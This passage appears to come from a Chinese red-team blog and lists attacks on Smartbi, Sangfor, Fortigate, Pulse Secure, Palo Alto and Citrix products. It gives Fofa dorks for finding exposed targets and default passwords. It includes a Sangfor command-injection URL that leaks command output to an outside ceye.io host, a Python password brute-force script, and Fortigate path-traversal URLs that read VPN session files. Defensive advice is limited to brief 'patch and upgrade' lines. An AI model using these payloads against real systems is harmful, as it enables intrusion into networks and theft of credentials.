<span class="hljs-built_in">String</span> sqlUserGroup = <span class="hljs-string">&quot;delete from t_group_user where c_userid in &quot;</span> + idStr;            prep = conn.prepareStatement(sqlUser);            prep.execute();            prep = conn.prepareStatement(sqlUserAttr);            prep.execute();            prep = conn.prepareStatement(sqlUserconfig);            prep.execute();            prep = conn.prepareStatement(sqlUserRole);            prep.execute();            prep = conn.prepareStatement(sqlUserGroup);            prep.execute();            conn.commit();        &#125; <span class="hljs-keyword">catch</span> (Exception var17) &#123;            <span class="hljs-keyword">try</span> &#123;                succ = <span class="hljs-literal">false</span>;                conn.rollback();            &#125; <span class="hljs-keyword">catch</span> (SQLException var16) &#123;                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);            &#125;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);        &#125; <span class="hljs-keyword">finally</span> &#123;            DbUtil.closeDBObject((ResultSet)rs, prep, conn);        &#125;        <span class="hljs-keyword">return</span> succ ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;&#125;</code></pre><p><strong>6. 漏洞利用</strong></p><p>这里是delete 注入, 不建议使用, 没看到有公开的利用信息, 就不写EXP了</p><p><strong>7. 利用技巧</strong></p><p>1.RMIServlet加解密代码</p><p>虽然利用不能写EXP, 这里写一个RMIServlet 的加解密代码</p><pre><code class="hljs csharp">ENCODING_SCHEDULE = &#123;    <span class="hljs-string">&quot;0&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;6&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;8&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;9&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>,     <span class="hljs-string">&quot;%&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;(&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>,     <span class="hljs-string">&quot;D&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;E&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;F&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;G&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;H&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;I&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;J&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;K&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;L&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;M&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;N&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>,     <span class="hljs-string">&quot;O&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;Q&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;R&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;S&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;T&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;U&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;V&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;W&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;X&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,     <span class="hljs-string">&quot;Z&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;h&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;j&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>,     <span class="hljs-string">&quot;k&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;l&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;m&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;o&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;q&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;t&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;u&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>,     <span class="hljs-string">&quot;v&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;z&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, &#125;DECODING_SCHEDULE = &#123;    <span class="hljs-string">&quot;7&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;u&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;N&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;K&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;J&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;M&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;9&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;m&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,     <span class="hljs-string">&quot;/&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;E&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;q&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;O&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;V&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;t&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>,     <span class="hljs-string">&quot;T&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;H&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;v&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;l&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;8&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;F&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>,     <span class="hljs-string">&quot;o&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;L&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;j&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;W&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;z&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>,     <span class="hljs-string">&quot;U&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;(&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;h&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;I&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;R&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>,     <span class="hljs-string">&quot;G&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;S&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;6&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;D&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;k&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;Q&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>,     <span class="hljs-string">&quot;g&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;X&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>: <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, &#125;<span class="hljs-meta">#此函数可以用来加密明文也可以解密服务器返回的密文</span><span class="hljs-function">def <span class="hljs-title">encode</span>(<span class="hljs-params">code</span>):</span><span class="hljs-function">    <span class="hljs-keyword">out</span></span> = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> code:        <span class="hljs-keyword">out</span> = <span class="hljs-keyword">out</span> + ENCODING_SCHEDULE.<span class="hljs-keyword">get</span>(item, item)    <span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span><span class="hljs-function">def <span class="hljs-title">decode</span>(<span class="hljs-params">code</span>):</span><span class="hljs-function">    <span class="hljs-keyword">out</span></span> = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> code:        <span class="hljs-keyword">out</span> = <span class="hljs-keyword">out</span> + DECODING_SCHEDULE.<span class="hljs-keyword">get</span>(item, item)    <span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span></code></pre><p>2.该系统还有几处漏洞, 比如默认口令</p><pre><code class="hljs nsis">demo/demomanager/demo<span class="hljs-literal">admin</span>/<span class="hljs-literal">admin</span><span class="hljs-literal">admin</span>/manager<span class="hljs-literal">admin</span>/<span class="hljs-number">2</span>manager</code></pre><p>3.默认路径</p><p><code>http://127.0.0.1:18080/smartbi/vision/config.jsp</code> 可能未修改密码或者密码为<code>manager</code></p><p>4.进入后台目录遍历</p><p><code>http://127.0.0.1:18080/smartbi/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=C%3A%2F</code></p><p>同样是后台可以加载插件, 怎么getshell不用我多说了吧</p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.使用强口令</p><p>3.版本最好为最新版8.5以上, v7还有其他漏洞</p><h2 id="第二节"><a href="#第二节" class="headerlink" title="第二节"></a>第二节</h2><blockquote><p>本节主要是针对网络边界产品, VPN, 防火墙, 邮箱一类的相关漏洞, 属于典型灯下黑的情况, 厂商可能会忘记, 但是攻击者不会放过一丝一毫</p></blockquote><h2 id="深信服VPN远程代码执行"><a href="#深信服VPN远程代码执行" class="headerlink" title="深信服VPN远程代码执行"></a>深信服VPN远程代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>深信服 VPN 某个特定产品存在远程代码执行, 2019 攻防演练使用过</p><p><strong>2. 影响组件</strong><br>深信服 VPN</p><p><strong>3. 漏洞指纹</strong></p><p><code>Set-Cookie: TWFID=</code></p><p><code>welcome to ssl vpn</code></p><p><code>Sinfor</code></p><p><strong>4. Fofa Dork</strong></p><p><code>header=&quot;Set-Cookie: TWFID=&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>深信服vpnweb登录逆向学习 – potatso – 博客园<br><a href="https://www.cnblogs.com/potatsoSec/p/12326356.html">https://www.cnblogs.com/potatsoSec/p/12326356.html</a></p><p><strong>6. 漏洞利用</strong></p><p><code>wget -t %d -T %d --spider %s</code></p><pre><code class="hljs awk">https:<span class="hljs-regexp">/123.123.123.123/</span>por<span class="hljs-regexp">/checkurl.csp?timeout=3&amp;retry=0&amp;url=http:/</span><span class="hljs-regexp">/admin.ceye.io/</span>`uname`</code></pre><p><strong>7. 利用技巧</strong></p><p>1.该版本深信服VPN属于相对早期的版本, 大概2008年左右, 但目前还有761个ip开放在公网</p><p>2.该版本较低, <code>whomai</code>不存在, 可以使用 <code>uname</code>, 这里没有空格可dns传出来</p><p>3.去除空格也简单 <code>cat /etc/passwd | tr &quot; \n&quot; &quot;+|&quot;</code></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="深信服-VPN-口令爆破"><a href="#深信服-VPN-口令爆破" class="headerlink" title="深信服 VPN 口令爆破"></a>深信服 VPN 口令爆破</h2><p><strong>1. 漏洞简介</strong></p><p>深信服 VPN 针对口令爆破是5次错误锁定IP五分钟, 所以这里爆破也不是不行, 主要是测试常见弱口令以及分布式爆破也不是不行</p><p><strong>2. 影响组件</strong><br>深信服 VPN</p><p><strong>3. 漏洞指纹</strong></p><p><code>/por/login_auth.csp?apiversion=1</code></p><p><code>sangfor</code></p><p><code>/cgi-bin/login.cgi?rnd=</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;深信服-SSL-VPN&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>关于SSL VPN认证时的验证码绕过 – SSL VPN/EMM – 深信服社区<br><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633">https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633</a></p><p>此处存疑, 时间问题没有测试</p><p><strong>6. 漏洞利用</strong></p><p>1.深信服VPN 口令爆破 demo (这里仅测试了M6,其他的应该差不多)</p><pre><code class="hljs routeros"><span class="hljs-comment">#encoding=utf8</span>import requestsimport hashlibimport urllib3urllib3.disable_warnings()import resession = requests.session()def SanForLogin(target, password, <span class="hljs-attribute">username</span>=<span class="hljs-string">&quot;admin&quot;</span>):    burp0_url = target +<span class="hljs-string">&quot;/cgi-bin/login.cgi?rnd=&quot;</span>    burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36&quot;</span>&#125;    r1 = session.<span class="hljs-builtin-name">get</span>(burp0_url, <span class="hljs-attribute">verify</span>=<span class="hljs-literal">False</span>)    sid = r1.cookies[<span class="hljs-string">&quot;sinfor_session_id&quot;</span>]    Epassword = hashlib.sha1(password+sid).hexdigest()    burp0_data = &#123;<span class="hljs-string">&quot;user&quot;</span>: username, <span class="hljs-string">&quot;password&quot;</span>: Epassword, <span class="hljs-string">&quot;logintime&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;program&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;language&quot;</span>: <span class="hljs-string">&quot;zh_CN&quot;</span>&#125;    r2 = session.post(burp0_url, <span class="hljs-attribute">headers</span>=burp0_headers, <span class="hljs-attribute">data</span>=burp0_data, <span class="hljs-attribute">verify</span>=<span class="hljs-literal">False</span>)    r2.<span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>    <span class="hljs-keyword">if</span> r2.<span class="hljs-attribute">status_code</span>==200 <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;&lt;TITLE&gt;Loading...&lt;/TITLE&gt;&quot;</span> <span class="hljs-keyword">in</span> r2.text:        <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;Success! admin password is &quot;</span>, password)        <span class="hljs-builtin-name">print</span>(r2.cookies[<span class="hljs-string">&quot;sinfor_session_id&quot;</span>])        return password    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">&quot;var loginInfo = \&quot;.*?\&quot;&quot;</span>, r2.text):            <span class="hljs-builtin-name">print</span>(x)            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;IP&quot;</span> <span class="hljs-keyword">in</span> x:                <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;IP lock wait for 5 mins&quot;</span>)                time.sleep(305)SanForLogin(<span class="hljs-string">&quot;https://xxxxxxxxxxx/&quot;</span>, <span class="hljs-string">&quot;admin&quot;</span>)</code></pre><p><strong>7. 利用技巧</strong></p><p>1.由于深信服涉及的版本跨度时间达十几年, 很多地方不一样, 但是总体都差不太多</p><p>国外APT组织应该也批量爆破了一波</p><p>加密的密码也就是 <code>sha1(password+sid)</code></p><p>爆破也就锁一会ip, 夜里丢一边跑着就完事了, 弱口令也就那么些</p><p><code>admin/123456/Sangfor/Sangfor@123</code></p><p>2.如果爆破出来了管理员密码, 管理员后台有好多处命令注入, 比如升级工具, 这里讲起来应该是正常功能</p><p>3.去年传闻还有前台sql注入, 但是没拿到补丁, 手头没环境, 就没分析, 看一下乌云上的老洞吧</p><p>深信服SSL VPN外置数据中心敏感信息泄漏&amp;SQL注入漏洞可导致getshell – 体验盒子 – 关注网络安全<br><a href="https://www.uedbox.com/post/31092/">https://www.uedbox.com/post/31092/</a></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="Fortigate-SSL-VPN-文件读取-远程代码执行"><a href="#Fortigate-SSL-VPN-文件读取-远程代码执行" class="headerlink" title="Fortigate SSL VPN 文件读取/远程代码执行"></a>Fortigate SSL VPN 文件读取/远程代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>Fortigate SSL VPN 在全球用户量巨大, 去年橘子哥发现了文件读取和远程代码执行漏洞</p><p><strong>2. 影响组件</strong><br>Fortigate SSL VPN</p><p><strong>3. 漏洞指纹</strong></p><p><code>Fortigate</code></p><p><code>4tinet2095866</code></p><p><strong>4. Fofa Dork</strong></p><p><code>&quot;Fortigate&quot; &amp;&amp; port=10443</code></p><p><strong>5. 漏洞分析</strong></p><p>Orange: Attacking SSL VPN – Part 2: Breaking the Fortigate SSL VPN<br><a href="https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1">https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1</a></p><p><strong>6. 漏洞利用</strong></p><p>密码读取</p><p>milo2012/CVE-2018-13379: CVE-2018-13379<br><a href="https://github.com/milo2012/CVE-2018-13379">https://github.com/milo2012/CVE-2018-13379</a></p><p>任意密码重置, 这肯定是个后门</p><p>milo2012/CVE-2018-13382: CVE-2018-13382<br><a href="https://github.com/milo2012/CVE-2018-13382">https://github.com/milo2012/CVE-2018-13382</a></p><p><strong>7. 利用技巧</strong></p><p>1.文件读取的路径构造</p><p><code>https://xxxxxx:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession</code></p><p>如下padding可以构造出来任意文件读取, 可以读取其他文件, 注意这个系统好像没有/etc/passwd</p><p><code>print(&quot;/../../../../&quot;+(raw_input().rjust(35, &#39;/&#39;)))</code></p><p>2.寻找魔术数字</p><p>虽然当时橘子哥没有公开魔术数字, 但是当时随手分析了一下下面这个启动文件, 搜索一下magic就找到 4tinet2095866,</p><p><code>https://xxxxxxxx:10443/remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd</code></p><p>后来发现这个字符串在js里面也有, 直接从前台分析也可以获得</p><p><code>https://xxxxx:10443/sslvpn/js/login.js?q=5f9a6877fd1f78da768239aae6e739c2</code></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="Pulse-Secure-SSL-VPN远程代码执行漏洞"><a href="#Pulse-Secure-SSL-VPN远程代码执行漏洞" class="headerlink" title="Pulse Secure SSL VPN远程代码执行漏洞"></a>Pulse Secure SSL VPN远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Pulse Secure SSL VPN 在全球用户量巨大, 去年橘子哥发现了很多漏洞</p><p><strong>2. 影响组件</strong></p><p>Pulse Secure SSL VPN</p><p><strong>3. 漏洞指纹</strong></p><p><code>Pulse Secure SSL VPN</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;PulseSecure-SSL-VPN&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Pulse Secure SSL VPN远程代码执行漏洞利用与分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/185773">https://www.anquanke.com/post/id/185773</a></p><p><strong>6. 漏洞利用</strong></p><p>projectzeroindia/CVE-2019-11510: Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510)<br><a href="https://github.com/projectzeroindia/CVE-2019-11510">https://github.com/projectzeroindia/CVE-2019-11510</a></p><p>0xDezzy/CVE-2019-11539: Exploit for the Post-Auth RCE vulnerability in Pulse Secure Connect<br><a href="https://github.com/0xDezzy/CVE-2019-11539">https://github.com/0xDezzy/CVE-2019-11539</a></p><p><strong>7. 利用技巧</strong></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="Palo-Alto-GlobalProtect-VPN远程代码执行漏洞"><a href="#Palo-Alto-GlobalProtect-VPN远程代码执行漏洞" class="headerlink" title="Palo Alto GlobalProtect VPN远程代码执行漏洞"></a>Palo Alto GlobalProtect VPN远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Palo Alto GlobalProtect 在全球用户量巨大, 去年橘子哥发现了很多漏洞</p><p><strong>2. 影响组件</strong><br>Palo Alto GlobalProtect</p><p><strong>3. 漏洞指纹</strong></p><p><code>GlobalProtect Portal</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;PaloAlto-GlobalProtect&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Orange: Attacking SSL VPN – Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!<br><a href="https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html">https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html</a></p><p>Palo Alto GlobalProtect上的PreAuth RCE – 渗透测试中心 – 博客园<br><a href="https://www.cnblogs.com/backlion/p/11209054.html">https://www.cnblogs.com/backlion/p/11209054.html</a></p><p><strong>6. 漏洞利用</strong></p><p>securifera/CVE-2019-1579<br><a href="https://github.com/securifera/CVE-2019-1579">https://github.com/securifera/CVE-2019-1579</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个扫描的话可以判断</p><p><code>/global-protect/portal/css/login.css</code><br><code>/images/logo_pan_158.gif</code></p><p><code>Last-Modified</code> 是否早于于2018年</p><p><code>curl -s -I https://sslvpn/global-protect/portal/css/login.css | grep Last-Modified</code></p><p><code>Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT</code></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="Citrix-Gateway-ADC-远程代码执行漏洞-CVE-2019-19781"><a href="#Citrix-Gateway-ADC-远程代码执行漏洞-CVE-2019-19781" class="headerlink" title="Citrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781)"></a>Citrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781)</h2><p><strong>1. 漏洞简介</strong></p><p>Citrix Gateway/ADC 在全球拥有很多的大客户. 这也是个很经典的灯下黑漏洞(后门)</p><p><strong>2. 影响组件</strong></p><p>Citrix Gateway/ADC</p><p><strong>3. 漏洞指纹</strong></p><p><code>Citrix Gateway/ADC</code></p><p><strong>4. Fofa 